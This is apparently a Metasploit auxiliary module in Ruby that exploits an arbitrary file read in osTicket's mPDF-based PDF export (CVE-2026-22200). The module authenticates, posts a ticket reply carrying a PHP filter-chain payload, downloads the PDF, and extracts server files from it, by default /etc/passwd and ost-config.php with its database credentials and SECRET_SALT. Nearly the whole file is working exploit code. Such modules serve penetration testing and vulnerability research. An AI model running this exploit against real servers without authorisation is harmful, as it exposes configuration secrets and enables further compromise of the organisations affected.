##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Osticket

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'osTicket Arbitrary File Read via PHP Filter Chains in mPDF',
        'Description' => %q{
          This module exploits an arbitrary file read vulnerability in osTicket
          (CVE-2026-22200). The vulnerability exists in osTicket's PDF export
          functionality which uses mPDF. By injecting a specially crafted HTML payload
          containing PHP filter chain URIs into a ticket reply, an attacker can read
          arbitrary files from the server when the ticket is exported to PDF.

          The PHP filter chain constructs a BMP image header that is prepended to the
          target file contents. When mPDF renders the ticket as a PDF, it processes
          the php://filter URI, reads the target file, and embeds it as a bitmap image
          in the resulting PDF. The module then extracts the file contents from the PDF.

          Authentication is required. The module supports both staff panel (/scp/) and
          client portal login. An existing ticket number is also required.

          Default files extracted are /etc/passwd and include/ost-config.php. The
          osTicket config file contains database credentials and the SECRET_SALT value.
        },
        'Author' => [
          'HORIZON3.ai Team', # Vulnerability discovery and PoC
          'Arkaprabha Chakraborty <@t1nt1nsn0wy>' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-22200'],
          ['URL', 'https://horizon3.ai/attack-research/attack-blogs/ticket-to-shell-exploiting-php-filters-and-cnext-in-osticket-cve-2026-22200'],
          ['URL', 'https://github.com/horizon3ai/CVE-2026-22200/tree/main']
        ],
        'DisclosureDate' => '2026-01-13',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path to osTicket installation', '/']),
        OptString.new('USERNAME', [true, 'osTicket username or email address']),
        OptString.new('PASSWORD', [true, 'osTicket password']),
        OptString.new('TICKET_NUMBER', [false, 'Ticket number to use for payload injection (e.g. 978554). If not set, a new ticket is created each run']),
        OptString.new('TICKET_ID', [false, 'Internal ticket ID (auto-detected if not set)']),
        OptEnum.new('LOGIN_PORTAL', [true, 'Login portal to use', 'auto', ['auto', 'scp', 'client']]),
        OptString.new('FILE', [
          true,
          'Path for file to read.',
          '/etc/passwd'
        ]),
        OptString.new('SCP_TICKET_EMAIL', [
          false,
          'Email for ticket owner when creating tickets via SCP portal login. ' \
          'Only used if authentication succeeds through the SCP (/scp/) portal.',
          'user@msf.com'
        ]),
        OptString.new('SCP_TICKET_NAME', [
          false,
          'Full name for ticket owner when creating tickets via SCP portal login. ' \
          'Only used if authentication succeeds through the SCP (/scp/) portal.',
          'MSF User'
        ]),
        OptString.new('TICKET_SUBJECT', [false, 'Subject for new ticket if TICKET_NUMBER is not set', 'Support Request']),
        OptString.new('TICKET_MESSAGE', [false, 'Message body for new ticket if TICKET_NUMBER is not set', 'Please assist.']),
        OptBool.new('STORE_LOOT', [false, 'Store extracted files as loot', true]),
        OptInt.new('MAX_REDIRECTS', [false, 'Maximum number of HTTP redirect hops to follow', 3]),
        OptInt.new('MAX_TICKET_ID', [false, 'Upper bound for brute-force ticket ID search', 20])
      ]
    )
  end

  def check
    begin
      res = send_request_cgi!(
        { 'method' => 'GET', 'uri' => normalize_uri(datastore['TARGETURI']) },
        20,
        datastore['MAX_REDIRECTS']
      )
    rescue ::Rex::ConnectionError, ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Errno::ETIMEDOUT => e
      return Exploit::CheckCode::Unknown("Could not connect to target: #{e.message}")
    end

    return Exploit::CheckCode::Unknown('No response from target') unless res

    return Exploit::CheckCode::Safe('Target does not appear to be an osTicket installation') unless osticket?(res)

    Exploit::CheckCode::Detected('Target appears to be an osTicket installation')
  end

  def run
    base_uri = datastore['TARGETURI']
    file_raw = datastore['FILE'].to_s.strip

    fail_with(Failure::BadConfig, 'No file specified in FILE option') if file_raw.empty?

    if file_raw.include?(':')
      file_path, file_enc = file_raw.split(':', 2)
      file_enc = 'plain' unless %w[plain b64 b64zlib].include?(file_enc)
    else
      file_path = file_raw
      file_enc = 'plain'
    end

    print_status("Target: #{rhost}:#{rport}")
    print_status("File to extract: #{file_path}")

    # Step 1: Login
    print_status('Attempting authentication...')
    portal, cookies = do_login(base_uri)
    if portal.nil?
      fail_with(Failure::NoAccess, "Login failed with #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
    end
    prefix = portal == 'scp' ? '/scp' : ''
    print_good("Authenticated via #{portal} portal")

    # Step 2: Locate or create ticket
    ticket_number = datastore['TICKET_NUMBER'].to_s
    if ticket_number.empty?
      print_warning('No TICKET_NUMBER supplied — a new ticket will be created each time this module runs')
      ticket_id, ticket_number = if portal == 'scp'
                                   create_ticket_scp(base_uri, prefix, cookies, datastore['TICKET_SUBJECT'], datastore['TICKET_MESSAGE'])
                                 else
                                   create_ticket(base_uri, cookies, datastore['TICKET_SUBJECT'], datastore['TICKET_MESSAGE'])
                                 end
      fail_with(Failure::UnexpectedReply, 'Failed to create new ticket') if ticket_id.nil?
      print_good("Created ticket ##{ticket_number} (internal ID: #{ticket_id})")
    else
      print_status('Locating ticket...')
      ticket_id = resolve_ticket_id(base_uri, prefix, cookies)
      fail_with(Failure::NotFound, "Could not find internal ID for ticket ##{ticket_number}. Try setting TICKET_ID manually.") if ticket_id.nil?
      print_good("Ticket ##{ticket_number} has internal ID: #{ticket_id}")
    end

    # Step 3: Generate and submit payload
    print_status('Generating PHP filter chain payload...')
    file_spec = file_enc == 'plain' ? file_path : "#{file_path},#{file_enc}"
    payload_html = generate_ticket_payload([file_spec], is_reply: true)
    print_status("Payload generated (#{payload_html.length} bytes)")

    print_status('Submitting payload as ticket reply...')
    reply_ok = submit_ticket_reply(base_uri, prefix, ticket_id, payload_html, cookies)
    if reply_ok
      print_good('Reply posted successfully')
    else
      print_warning('Reply submission did not return expected confirmation. Continuing...')
    end

    # Step 4: Download PDF
    print_status('Downloading ticket PDF...')
    pdf_data = download_ticket_pdf(base_uri, prefix, ticket_id, cookies, datastore['MAX_REDIRECTS'] || 3)
    if pdf_data.nil?
      fail_with(Failure::UnexpectedReply, 'Failed to download PDF export')
    end
    print_good("PDF downloaded (#{pdf_data.length} bytes)")

    # Step 5: Extract file from PDF
    print_status('Extracting file from PDF...')
    extracted = extract_files_from_pdf(pdf_data)
    if extracted.empty?
      print_error('No file could be extracted from the PDF')
      if datastore['STORE_LOOT']
        path = store_loot('osticket.pdf', 'application/pdf', rhost, pdf_data, 'ticket.pdf', 'Raw PDF export')
        print_status("Raw PDF saved as loot: #{path}")
      end
      return
    end
    content = extracted.last
    print_good("Extracted #{content.length} bytes")

    # Step 6: Display and store result
    safe_name = file_path.tr('/', '_').sub(/\A_+/, '')
    print_line
    print_line('=' * 70)
    print_line('EXTRACTED FILE CONTENTS')
    print_line('=' * 70)
    print_line
    print_line("--- [#{file_path}] (#{content.length} bytes) ---")

    begin
      text = content.encode('UTF-8', 'binary', invalid: :replace, undef: :replace, replace: '')
      text.sub!(/[\x00-\x08\x0e-\x1f].*\z/m, '') # Strip trailing BMP padding artifacts
      if text.length > 3000
        print_line(text[0, 3000])
        print_line("\n... (truncated)")
      else
        print_line(text)
      end
    rescue EncodingError
      print_line('[Binary data]')
    end

    if datastore['STORE_LOOT']
      path = store_loot(
        "osticket.#{safe_name}",
        'application/octet-stream',
        rhost,
        content,
        safe_name,
        "File read from osTicket server: #{file_path}"
      )
      print_good("Saved to: #{path}")
    end

    # Look for key secrets in ost-config.php
    report_secrets([content])

    print_line
    print_good('Exploitation complete')
  end

  private

  # Attempts login via the configured portal (auto tries SCP first, then client).
  # Returns [portal_type, cookies] or [nil, nil].
  def do_login(base_uri)
    portal_pref = datastore['LOGIN_PORTAL']
    print_status("do_login: portal preference=#{portal_pref}, base_uri=#{base_uri}, username=#{datastore['USERNAME']}")

    if portal_pref == 'auto' || portal_pref == 'scp'
      print_status('do_login: Trying staff panel (/scp/) login...')
      cookies = osticket_login_scp(base_uri, datastore['USERNAME'], datastore['PASSWORD'])
      if cookies
        print_good("do_login: SCP login succeeded, cookies=#{cookies}")
        return ['scp', cookies]
      end
      print_status('do_login: Staff panel login failed') if portal_pref == 'auto'
    end

    if portal_pref == 'auto' || portal_pref == 'client'
      print_status('do_login: Trying client portal login...')
      cookies = osticket_login_client(base_uri, datastore['USERNAME'], datastore['PASSWORD'])
      if cookies
        print_good("do_login: Client portal login succeeded, cookies=#{cookies}")
        return ['client', cookies]
      end
      print_status('do_login: Client portal login failed')
    end

    print_error('do_login: All login attempts failed')
    [nil, nil]
  end

  # Resolves the internal ticket ID from the user-provided ticket number or datastore override.
  def resolve_ticket_id(base_uri, prefix, cookies)
    if datastore['TICKET_ID'] && !datastore['TICKET_ID'].empty?
      print_status("resolve_ticket_id: Using manually set TICKET_ID=#{datastore['TICKET_ID']}")
      return datastore['TICKET_ID']
    end

    find_ticket_id(base_uri, prefix, datastore['TICKET_NUMBER'], cookies, datastore['MAX_TICKET_ID'] || 20)
  end

end
